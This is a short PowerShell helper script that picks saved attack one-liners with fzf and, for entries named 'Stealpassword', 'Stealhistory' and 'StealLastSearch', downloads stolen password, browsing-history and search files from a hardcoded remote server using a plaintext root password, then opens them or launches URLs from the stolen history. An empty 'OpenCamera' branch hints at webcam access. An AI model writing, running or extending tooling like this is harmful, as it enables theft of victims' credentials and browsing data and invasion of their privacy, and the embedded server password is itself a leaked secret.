if ($args.count -eq 0)
{
    $sel = cat "c:\scripts\oneliners\oneliners.list" | fzf --height 50% --reverse
    $output = $sel|%{$_.split('~')[1]}
    $item = $sel | awk '{print $1}'
    set-clipboard $output
    echo $output
    echo "Copied!"
    nd

    if ($item -eq "Stealpassword")
    {
        pscp -pw jf19973007 root@213.168.249.164:uploads/pass.txt "passwords.txt"
        vim passwords.txt
    }
    if ($item -eq "Stealhistory")
    {
        pscp -pw jf19973007 root@213.168.249.164:uploads/hist.txt "history.txt"
        $sel = cat history.txt | ? {$_ -match "URL               :"} | unique |fzf
        $url = $sel | awk '{print $3}'
        if ($url -ne $null)
        {
            start-process $url
        }
    }
    if ($item -eq "StealLastSearch")
    {
        pscp -pw jf19973007 root@213.168.249.164:uploads/lastsearch.txt "lastsearch.txt"
        cat "lastsearch.txt"
    }
    if ($item -eq "OpenCamera")
    {

    }
}
